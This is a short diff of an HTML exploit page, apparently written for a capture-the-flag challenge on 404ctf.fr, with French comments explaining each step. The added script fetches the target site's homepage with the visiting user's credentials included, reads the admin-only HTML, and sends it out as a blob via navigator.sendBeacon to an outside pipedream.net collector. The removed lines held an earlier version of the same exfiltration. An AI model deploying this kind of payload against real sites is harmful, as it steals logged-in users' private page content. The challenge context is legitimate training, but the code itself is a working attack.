@@ -13,13 +13,20 @@
 
     <script>
       (async () => {
-        // ❌ fetch("/") va TOUJOURS appeler la racine de TON serveur
-        //    (ici : bastien750.github.io/), pas celle du CTF.
-        const html = await fetch("/", { credentials: "include" }).then((r) =>
-          r.text()
-        );
-        out.textContent = html; // ← tu mets dans le <pre> ce que TU as servi
-        navigator.sendBeacon("https://eoyi24wnc60zgb.m.pipedream.net", html);
+        // 1️⃣ On cible explicitement la home du CTF
+        const resp = await fetch("https://spacefleetcommand.404ctf.fr/", {
+          credentials: "include",
+        });
+
+        // 2️⃣ On lit le HTML (incluant les sections admin-only)
+        const html = await resp.text();
+
+        // 3️⃣ On l’affiche pour debug
+        document.getElementById("out").textContent = html;
+
+        // 4️⃣ Exfiltration en POST (blob) pour éviter la limite de taille
+        const blob = new Blob([html], { type: "text/plain" });
+        navigator.sendBeacon("https://eoyi24wnc60zgb.m.pipedream.net", blob);
       })();
     </script>
   </body>
